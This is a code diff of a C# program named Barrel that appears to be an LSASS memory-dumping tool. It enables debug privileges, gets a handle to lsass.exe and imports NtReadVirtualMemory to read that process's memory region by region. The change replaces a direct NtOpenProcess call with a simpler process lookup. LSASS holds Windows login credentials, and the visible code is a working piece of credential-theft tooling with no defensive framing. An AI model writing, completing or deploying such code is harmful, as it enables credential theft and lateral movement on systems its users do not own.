@@ -8,7 +8,6 @@ using System.Text;
 using System.IO.Compression;
 using System.IO;
 using System.Runtime.InteropServices.ComTypes;
-using static Barrel.Program;
 
 
 namespace Barrel
@@ -29,9 +28,6 @@ namespace Barrel
         public const uint TOKEN_QUERY = 0x00000008;
         public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
 
-
-        [DllImport("ntdll.dll")]
-        public static extern uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID processId);
 
         [DllImport("ntdll.dll")]
         public static extern bool NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
@@ -67,13 +63,6 @@ namespace Barrel
             public int State;
             public int Protect;
             public int Type;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct CLIENT_ID
-        {
-            public IntPtr UniqueProcess;
-            public IntPtr UniqueThread;
         }
 
         [StructLayout(LayoutKind.Sequential, Pack = 0)]
@@ -347,21 +336,8 @@ namespace Barrel
             EnableDebugPrivileges();
 
             // Get process name
-            string proc_name = "lsass.exe"; // "l"+"s"+"a"+"s"+"s"+".+"+"e"+"x"+"e";
-            IntPtr process_handle = GetProcessByName(proc_name).First();
-            int processPID = get_pid(process_handle);
-
-            // Get process handle with NtOpenProcess
-            IntPtr processHandle = IntPtr.Zero;
-            CLIENT_ID client_id = new CLIENT_ID();
-            client_id.UniqueProcess = (IntPtr)processPID;
-            client_id.UniqueThread = IntPtr.Zero;
-            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
-            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
-            if (ntstatus != 0)
-            {
-                Console.WriteLine("[-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
-            }
+            string proc_name = "lsass.exe";
+            IntPtr processHandle = GetProcessByName(proc_name).First();
             Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
 
             // Loop the memory regions
